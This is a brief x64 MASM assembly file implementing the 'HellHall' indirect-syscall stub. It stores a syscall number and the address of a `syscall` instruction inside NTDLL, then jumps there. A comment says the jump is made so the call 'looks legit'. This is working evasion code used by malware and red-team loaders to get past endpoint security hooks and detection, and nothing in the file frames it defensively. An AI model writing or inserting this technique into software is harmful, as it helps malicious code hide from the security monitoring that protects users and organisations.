.data
	dwSSN	DWORD	0h	; SYSCALL SSN
	qAddr	QWORD	0h	; `syscall` INSTRUCTION ADDRESS (INSIDE OF NTDLL)

.code


	public SetConfig
SetConfig proc	
	mov dwSSN, ecx
	mov qAddr, rdx			
	ret
SetConfig endp


	public HellHall
HellHall proc
	mov r10, rcx
	mov eax, dwSSN				; 
	jmp qword ptr [qAddr]		; JUMPING TO A ADDRESS WHERE WE HAVE `syscall` INSTRUCTION - SO THAT IT LOOKS LEGIT
	ret
HellHall endp


end